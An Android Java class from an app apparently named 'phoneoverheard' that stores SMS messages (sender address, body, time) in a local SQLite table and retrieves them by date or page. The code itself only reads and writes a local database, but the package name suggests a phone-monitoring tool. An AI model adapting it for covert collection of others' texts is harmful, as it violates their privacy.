package com.phoneoverheard.database;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;


import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.IBinder;

@SuppressLint("SimpleDateFormat")
public class SmsmsgService extends Service {
    @SuppressWarnings("unused")
	private static final String TAG = "SmsmsgService";   
    private DatabaseHelper SmsmsgDatabasehelper; 
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
	public SmsmsgService(Context context){
		this.SmsmsgDatabasehelper = new DatabaseHelper(context);
	}

	public  void close() {
		if (SmsmsgDatabasehelper != null) {
			SmsmsgDatabasehelper.close();
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		if (SmsmsgDatabasehelper != null) {
			SmsmsgDatabasehelper.close();
		}
	}
	
	/**
     *向短信信息表中插入数据
     * @param smsmsg 
     * @return 无  
     */
    public void insert (Smsmsg smsmsg){ 
    	SQLiteDatabase db = SmsmsgDatabasehelper.getWritableDatabase();
    	db.execSQL("insert into smsmsg(read,type,datetime,address,body) values(?,?,?,?,?)",
    			new Object[]{ smsmsg.getRead(),smsmsg.getType(),smsmsg.getDatetime(),smsmsg.getAddress(),smsmsg.getBody()});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *从短信信息表中删除数据
     * @param datetime 
     * @return 无
     */
    public void delete (String datetime){ 
    	SQLiteDatabase db = SmsmsgDatabasehelper.getWritableDatabase();
    	db.execSQL("delete from Smsmsg where datetime<?", new Object[]{datetime});
    	db.close();
    	close();
    	onDestroy();
    }

	/**
     *查找短信信息表中所有数据
     * @param smsmsg 
     * @return 无             
     */
    public  List<Smsmsg>  find (String mindatetime){ 
    	List<Smsmsg> smsmsg = new ArrayList<Smsmsg>();
    	SQLiteDatabase db = SmsmsgDatabasehelper.getReadableDatabase();
    	Cursor smsmsgCursor = db.rawQuery("select * from smsmsg where datetime>?", new String[]{mindatetime});
    	while(smsmsgCursor.moveToNext()){
    		int read = smsmsgCursor.getInt(smsmsgCursor.getColumnIndex("read"));
    		int type = smsmsgCursor.getInt(smsmsgCursor.getColumnIndex("type"));
    		String datetime = smsmsgCursor.getString(smsmsgCursor.getColumnIndex("datetime"));
    		String address = smsmsgCursor.getString(smsmsgCursor.getColumnIndex("address"));
    		String body = smsmsgCursor.getString(smsmsgCursor.getColumnIndex("body"));
    		smsmsg.add(new Smsmsg(read,type,datetime,address,body));
    	}
    	if(smsmsgCursor != null){
    		smsmsgCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
    	return smsmsg;
    }
   
	/**
     *分页查询短信信息表中数据
     * @param pffset 从第几条数据开始
     * @param maxResult 最大返回几条数据
     * @return List<Smscmd> 结果集
     */
    public List<Smsmsg> getScrolldata (int pffset,int maxResult){ 
    	List<Smsmsg> smsmsg = new ArrayList<Smsmsg>();
    	SQLiteDatabase db = SmsmsgDatabasehelper.getReadableDatabase();
    	Cursor smsmsgCursor = db.rawQuery("select * from smsmsg order by _id asc limit ?,?", 
    				new String[]{String.valueOf(pffset),String.valueOf(maxResult)});
    	while(smsmsgCursor.moveToNext()){
    		int read = smsmsgCursor.getInt(smsmsgCursor.getColumnIndex("read"));
    		int type = smsmsgCursor.getInt(smsmsgCursor.getColumnIndex("type"));
    		String datetime = smsmsgCursor.getString(smsmsgCursor.getColumnIndex("datetime"));
    		String address = smsmsgCursor.getString(smsmsgCursor.getColumnIndex("address"));
    		String body = smsmsgCursor.getString(smsmsgCursor.getColumnIndex("body"));
    		smsmsg.add(new Smsmsg(read,type,datetime,address,body));
    	}
    	if(smsmsgCursor != null){
    		smsmsgCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return smsmsg;
    }
    
	/**
     *查询短信信息表中记录总数
     * @param 无
     * @return result 记录总数
     */
    public Long getCount (){ 
    	SQLiteDatabase db = SmsmsgDatabasehelper.getReadableDatabase();
    	Cursor smsmsgCursor = db.rawQuery("select count(*) from smsmsg", null);
    	smsmsgCursor.moveToFirst();
    	long result = smsmsgCursor.getLong(0);
    	if(smsmsgCursor != null){
    		smsmsgCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return result;
    }
    
	/**
     *查询短信信息表中记录是否存在
     * @param datetime
     * @return boolean
     */
    public boolean SmsmsgExist (String datetime,String address){ 
    	SQLiteDatabase db = SmsmsgDatabasehelper.getReadableDatabase();
    	Cursor smsmsgCursor = db.rawQuery("select count(*) from smsmsg where address=? and datetime=?", new String[]{address,datetime});
    	smsmsgCursor.moveToFirst();
    	long result = smsmsgCursor.getLong(0);
    	if(smsmsgCursor != null){
    		smsmsgCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
    	if(result==1){
    		return true;
    	}else{
    		return false;
    	}
    }
}
